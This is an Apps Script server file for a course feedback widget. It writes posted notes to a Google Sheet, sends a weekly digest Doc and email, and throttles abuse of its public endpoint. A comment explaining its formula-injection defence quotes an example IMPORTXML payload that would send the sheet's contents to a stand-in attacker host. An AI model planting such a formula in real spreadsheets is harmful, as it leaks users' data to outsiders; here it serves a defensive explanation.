/* =============================================================
   feedback-apps-script.js

   This file does NOT run on the website. It is the server side of the
   feedback widget, and it lives in Google Apps Script, attached to a
   Sheet in Purple Maiʻa's own Drive. It is kept in the repo so the
   whole system is readable in one place and can be rebuilt if the
   Sheet is ever lost.

   Two jobs:
     doPost()       catches a note from the widget, appends a row
     weeklyDigest() every Friday, writes a Google Doc and emails it

   ---------------------------------------------------------------
   SETUP, about five minutes, once
   ---------------------------------------------------------------
   1.  Go to sheets.new while signed in as keneth@purplemaia.org.
       Name it "LLM/NLP 101 feedback".

   2.  Extensions -> Apps Script. Delete the stub Code.gs contents and
       paste this entire file in. Save.

   3.  Run -> pick the `setup` function -> Run. Google will ask for
       permission; approve it. This writes the header row and creates
       the Friday trigger. Running it twice is safe.

   4.  Deploy -> New deployment -> gear icon -> Web app.
         Description:  feedback collector
         Execute as:   Me
         Who has access: ANYONE          <- must be Anyone, not
                                            "Anyone with a Google
                                            account". Staff are not
                                            all signed in, and the
                                            widget sends no cookies.
       Deploy, approve again, then copy the Web app URL. It looks like
         https://script.google.com/macros/s/AKfy..../exec

   5.  Paste that URL into content.js:
         feedback: { endpoint: "https://script.google.com/macros/s/.../exec", ... }
       Commit, push, deploy.

   6.  Open the live page, send one test note, and confirm a row lands
       in the Sheet. This step is not optional: the widget posts with
       mode:'no-cors', so the browser cannot see an error response. A
       misconfigured endpoint looks exactly like success from the page.

   7.  Optional: Run -> `weeklyDigest` by hand once to see the email
       and the Doc before Friday comes around.

   ---------------------------------------------------------------
   If you ever change the deployment, use Deploy -> Manage deployments
   -> edit the existing one -> New version. Creating a brand new
   deployment issues a NEW URL and the old one keeps working silently,
   which is how you end up with notes landing in a Sheet nobody reads.

   ---------------------------------------------------------------
   BLAST RADIUS, if somebody abuses the endpoint
   ---------------------------------------------------------------
   The web-app URL sits in content.js, which is public. Anyone who views
   source can POST to it directly. That is unavoidable for a form on a
   static page with no login, so the design limits what abuse can cost
   rather than pretending it cannot happen.

     The inbox cannot be flooded.  Mail goes out once a week, from the
       Friday trigger, never per submission. A million junk rows still
       produce exactly one email.

     Junk lands in a Sheet, not in your face.  Deleting rows is a drag
       and a right-click.

     Formulas cannot execute.  Every field from the request runs through
       _safeCell(); see the note there.

     Volume is capped twice.  _burst() stops a tight loop in a two-minute
       window, _recentCount() caps an hour, and Google's own Apps Script
       quotas sit behind both.

     The digest cannot be made unreadable.  weeklyDigest() writes at most
       MAX_DIGEST notes and says how many it skipped.

   KILL SWITCH: set feedback.endpoint back to "" in content.js and
   deploy. The widget reverts to the mailto fallback immediately and the
   page stops posting. To cut it off at the source as well, use
   Deploy -> Manage deployments -> Archive.
   ============================================================= */

var DIGEST_TO    = 'keneth@purplemaia.org';
var SHEET_NAME   = 'notes';
var MAX_MESSAGE  = 4000;   // matches the widget's maxlength
var MAX_PER_HOUR = 60;     // the page is public; this is the abuse ceiling
var MAX_DIGEST   = 200;    // notes written into one weekly Doc

var HEADERS = ['received', 'kind', 'message', 'name', 'where',
               'audience', 'page', 'device', 'digested'];

/* ---------- the collector ---------- */

function doPost(e) {
  try {
    var body = (e && e.postData && e.postData.contents) || '{}';
    var p = JSON.parse(body);

    var message = String(p.message || '').trim();
    if (!message) return _ok('empty');
    if (message.length > MAX_MESSAGE) message = message.slice(0, MAX_MESSAGE);

    if (_burst()) return _ok('throttled');

    var sheet = _sheet();
    if (_recentCount(sheet) > MAX_PER_HOUR) return _ok('throttled');

    // Every free-text field goes through _safeCell. The endpoint is public,
    // so assume the body is hostile.
    sheet.appendRow([
      new Date(),
      _safeCell(p.kind, 40),
      _safeCell(message, MAX_MESSAGE),
      _safeCell(p.name, 120),
      _safeCell(p.where, 300),
      _safeCell(p.audience, 60),
      _safeCell(p.page, 300),
      _safeCell(p.device, 200),
      ''
    ]);
    return _ok('saved');
  } catch (err) {
    // Never throw: the widget cannot read the response anyway, and a
    // thrown error here would lose the note. Park it where it can be found.
    try { _sheet().appendRow([new Date(), 'ERROR', String(err), '', '', '', '', '', '']); } catch (e2) {}
    return _ok('error');
  }
}

// A GET in a browser, so you can confirm the deployment is alive.
function doGet() {
  return ContentService
    .createTextOutput('LLM/NLP 101 feedback collector is running.')
    .setMimeType(ContentService.MimeType.TEXT);
}

/* ---------- the Friday digest ---------- */

function weeklyDigest() {
  var sheet = _sheet();
  var rows  = sheet.getDataRange().getValues();
  if (rows.length < 2) { return; }                 // header only, nothing to say

  var head = rows[0];
  var iDigested = head.indexOf('digested');
  var pending = [], rowNumbers = [];

  for (var r = 1; r < rows.length; r++) {
    if (rows[r][iDigested]) continue;              // already in a previous digest
    if (rows[r][1] === 'ERROR') continue;
    pending.push(_asNote(head, rows[r]));
    rowNumbers.push(r + 1);
  }

  if (!pending.length) {
    MailApp.sendEmail({
      to: DIGEST_TO,
      subject: 'LLM/NLP 101 feedback: nothing new this week',
      body: 'No notes came in since the last digest. The widget is still live.\n\n' +
            'Sheet: ' + _sheet().getParent().getUrl()
    });
    return;
  }

  // A flood should not produce a Doc too big to open. Write the first
  // MAX_DIGEST, say so plainly, and leave the rest marked as handled so
  // next week starts clean rather than replaying the flood.
  var total   = pending.length;
  var skipped = Math.max(0, total - MAX_DIGEST);
  var shown   = pending.slice(0, MAX_DIGEST);

  var doc = _buildDoc(shown, total, skipped);
  var url = doc.getUrl();

  MailApp.sendEmail({
    to: DIGEST_TO,
    subject: 'LLM/NLP 101 feedback: ' + total + ' note' + (total === 1 ? '' : 's') + ' this week' +
             (skipped ? ' (' + skipped + ' not shown)' : ''),
    htmlBody: _buildEmail(shown, url, skipped),
    body: _buildPlain(shown, url)
  });

  // Only mark them once the mail is away, so a failure here repeats
  // the digest next week rather than swallowing a week of feedback.
  var stamp = new Date();
  for (var i = 0; i < rowNumbers.length; i++) {
    sheet.getRange(rowNumbers[i], iDigested + 1).setValue(stamp);
  }
}

function _buildDoc(notes, total, skipped) {
  var today = Utilities.formatDate(new Date(), Session.getScriptTimeZone(), 'yyyy-MM-dd');
  var doc  = DocumentApp.create('LLM-NLP 101 feedback, week of ' + today);
  var b    = doc.getBody();

  b.appendParagraph('LLM/NLP 101 feedback').setHeading(DocumentApp.ParagraphHeading.TITLE);
  b.appendParagraph((total || notes.length) + ' note' + ((total || notes.length) === 1 ? '' : 's') +
                    ', collected up to ' + today +
                    (skipped ? '  ·  ' + skipped + ' not shown here, see the Sheet' : ''))
   .setHeading(DocumentApp.ParagraphHeading.SUBTITLE);

  // Gripes first. The complaints are the useful part and they should not
  // be at the bottom of a document nobody scrolls.
  var order = ['gripe', 'bug', 'suggestion'];
  var names = { gripe: 'Something is wrong', bug: 'Something is broken', suggestion: 'Ideas and requests' };

  var seen = {};
  order.forEach(function (kind) {
    var group = notes.filter(function (n) { return n.kind === kind; });
    if (!group.length) return;
    seen[kind] = true;
    b.appendParagraph(names[kind] + '  (' + group.length + ')')
     .setHeading(DocumentApp.ParagraphHeading.HEADING1);
    group.forEach(function (n) { _appendNote(b, n); });
  });

  var rest = notes.filter(function (n) { return !seen[n.kind]; });
  if (rest.length) {
    b.appendParagraph('Everything else  (' + rest.length + ')')
     .setHeading(DocumentApp.ParagraphHeading.HEADING1);
    rest.forEach(function (n) { _appendNote(b, n); });
  }

  b.appendParagraph('');
  b.appendParagraph('Where these came from')
   .setHeading(DocumentApp.ParagraphHeading.HEADING1);
  var byWhere = _tally(notes, 'where');
  Object.keys(byWhere).sort(function (a, c) { return byWhere[c] - byWhere[a]; })
    .forEach(function (k) {
      b.appendListItem(byWhere[k] + '  ' + k).setGlyphType(DocumentApp.GlyphType.BULLET);
    });

  doc.saveAndClose();
  return doc;
}

function _appendNote(body, n) {
  var p = body.appendParagraph(n.message);
  p.setSpacingBefore(10).setSpacingAfter(2);
  var meta = body.appendParagraph(
    [_when(n.received), n.where, n.audience, (n.name || 'anonymous'), n.device]
      .filter(String).join('  ·  ')
  );
  meta.setFontSize(8).setForegroundColor('#777777').setSpacingAfter(10);
}

function _buildEmail(notes, docUrl, skipped) {
  var h = ['<div style="font-family:system-ui,-apple-system,Segoe UI,sans-serif;font-size:14px;line-height:1.6">'];
  h.push('<p><strong>' + notes.length + ' note' + (notes.length === 1 ? '' : 's') +
         '</strong> came in this week.</p>');
  if (skipped) {
    h.push('<p style="color:#b4452c">' + skipped + ' further notes were held back to keep the Doc readable. ' +
           'That many at once usually means the endpoint is being hit by something automated: ' +
           'check the Sheet before trusting the batch.</p>');
  }
  h.push('<p><a href="' + docUrl + '">Open the full write-up as a Doc</a></p>');
  h.push('<hr style="border:0;border-top:1px solid #ddd;margin:16px 0">');
  notes.slice(0, 15).forEach(function (n) {
    h.push('<p style="margin:0 0 4px"><strong>' + _esc(n.kind) + '</strong> &middot; ' +
           '<span style="color:#666">' + _esc(n.where) + '</span></p>');
    h.push('<p style="margin:0 0 14px">' + _esc(n.message) + '</p>');
  });
  if (notes.length > 15) h.push('<p style="color:#666">…and ' + (notes.length - 15) + ' more in the Doc.</p>');
  h.push('</div>');
  return h.join('');
}

function _buildPlain(notes, docUrl) {
  var out = [notes.length + ' note(s) this week.', '', 'Doc: ' + docUrl, ''];
  notes.forEach(function (n) {
    out.push('[' + n.kind + '] ' + n.where);
    out.push(n.message);
    out.push('');
  });
  return out.join('\n');
}

/* ---------- plumbing ---------- */

function setup() {
  var sheet = _sheet();
  if (sheet.getLastRow() === 0) {
    sheet.appendRow(HEADERS);
    sheet.getRange(1, 1, 1, HEADERS.length).setFontWeight('bold');
    sheet.setFrozenRows(1);
    sheet.setColumnWidth(3, 460);          // the message column
  }
  ScriptApp.getProjectTriggers().forEach(function (t) {
    if (t.getHandlerFunction() === 'weeklyDigest') ScriptApp.deleteTrigger(t);
  });
  ScriptApp.newTrigger('weeklyDigest')
    .timeBased()
    .onWeekDay(ScriptApp.WeekDay.FRIDAY)
    .atHour(15)
    .create();
  Logger.log('Ready. Sheet: ' + sheet.getParent().getUrl());
}

function _sheet() {
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  return ss.getSheetByName(SHEET_NAME) || ss.insertSheet(SHEET_NAME);
}

/* Spreadsheet formula injection defence.

   This endpoint is published in the page source, so anybody can POST
   whatever they like to it. A message that begins with = + - @ or a
   control character is treated by Sheets as a FORMULA, not as text, and
   it runs the moment the sheet is opened. A note reading

     =IMPORTXML("https://evil.example/?x="&CONCATENATE(A1:I999), "//a")

   would quietly ship the contents of this sheet to a stranger. Prefixing
   a single quote forces Sheets to treat the value as literal text. The
   quote is a display artefact only; getValue() returns the clean string,
   so the digest reads exactly what the person typed.

   Keep this in front of every value that comes from the request body. */
function _safeCell(v, max) {
  var s = String(v == null ? '' : v).slice(0, max || 500);
  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
}

/* Burst limiter. _recentCount is an hourly ceiling measured by reading the
   sheet, which is too slow and too coarse to stop a tight loop. This is a
   cheap in-memory counter on a short window, checked first. Neither is a
   real defence against a determined attacker, and neither needs to be:
   see the note on blast radius at the top of this file. */
function _burst() {
  try {
    var cache = CacheService.getScriptCache();
    var n = Number(cache.get('burst') || 0) + 1;
    cache.put('burst', String(n), 120);        // 2 minute window
    return n > 20;
  } catch (e) { return false; }
}

function _recentCount(sheet) {
  var last = sheet.getLastRow();
  if (last < 2) return 0;
  var n = Math.min(last - 1, MAX_PER_HOUR + 5);
  var times = sheet.getRange(last - n + 1, 1, n, 1).getValues();
  var cut = new Date().getTime() - 3600000;
  return times.filter(function (t) {
    return t[0] instanceof Date && t[0].getTime() > cut;
  }).length;
}

function _asNote(head, row) {
  var o = {};
  head.forEach(function (h, i) { o[h] = row[i]; });
  return o;
}

function _tally(notes, field) {
  var m = {};
  notes.forEach(function (n) { var k = n[field] || 'unknown'; m[k] = (m[k] || 0) + 1; });
  return m;
}

function _when(d) {
  if (!(d instanceof Date)) return '';
  return Utilities.formatDate(d, Session.getScriptTimeZone(), 'EEE d MMM, HH:mm');
}

function _esc(s) {
  return String(s == null ? '' : s)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

function _ok(status) {
  return ContentService.createTextOutput(JSON.stringify({ status: status }))
    .setMimeType(ContentService.MimeType.JSON);
}
